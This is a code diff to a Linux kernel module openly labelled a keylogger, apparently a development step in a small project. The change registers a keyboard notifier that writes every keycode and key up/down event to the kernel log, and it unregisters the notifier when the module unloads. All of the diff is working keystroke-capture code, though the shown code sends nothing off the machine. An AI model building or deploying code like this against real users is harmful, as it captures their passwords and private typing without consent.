@@ -10,6 +10,8 @@
 #include <asm/system.h> /* cli(), *_flags */
 #include <asm/uaccess.h> /* copy_from/to_user */
 
+#include <linux/keyboard.h> /* register_keyboard_notifier etc */
+
 #define print812(...) printk( "<1>812 " ); printk( __VA_ARGS__ ); printk( "\n" );
 
 #define KEYLOG_MAJOR 60
@@ -29,24 +31,12 @@ struct file_operations fops = {
     release: key_release,
 };
 
-static int hello_init( void ) {
-    int err;
-    print812( "Initializing the module." );
-
-    err = register_chrdev( KEYLOG_MAJOR, KEYLOG_NAME, &fops );
-    if ( err < 0 ) {
-        print812( "Registering chrdev failed (%d)", err );
-        return err;
-    }
-    
-    return 0;
-}
-
 int key_open( struct inode *inode, struct file *filp ) {
     print812( "Received an open" );
 
     return 0;
 }
+
 ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
     char *debug_stmt = "Keylogger debug\n";
     unsigned length = strlen( debug_stmt );
@@ -64,14 +54,48 @@ ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
     }
 }
 
+int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
+    printk("HELLO NOTIFY");
+    
+    struct keyboard_notifier_param *param = _param;
+    struct vc_data *vc = param->vc;
+
+    if (code == KBD_KEYCODE) {
+        printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
+    }
+
+    return NOTIFY_OK;
+}
+
+static struct notifier_block keyboardNotifierBlock = {
+        .notifier_call = hello_notify
+};
+
 int key_release( struct inode *inode, struct file *filp ) {
     print812( "In release method" );
 
     return 0;
 }
 
+static int hello_init( void ) {
+    int err;
+    print812( "Initializing the module." );
+
+    err = register_chrdev( KEYLOG_MAJOR, KEYLOG_NAME, &fops );
+    if ( err < 0 ) {
+        print812( "Registering chrdev failed (%d)", err );
+        return err;
+    }
+
+    register_keyboard_notifier(&keyboardNotifierBlock);
+
+    return 0;
+}
+
 static void hello_exit( void ) {
     print812( "Unregistering the module" );
+
+    unregister_keyboard_notifier(&keyboardNotifierBlock);
 
     unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
 }
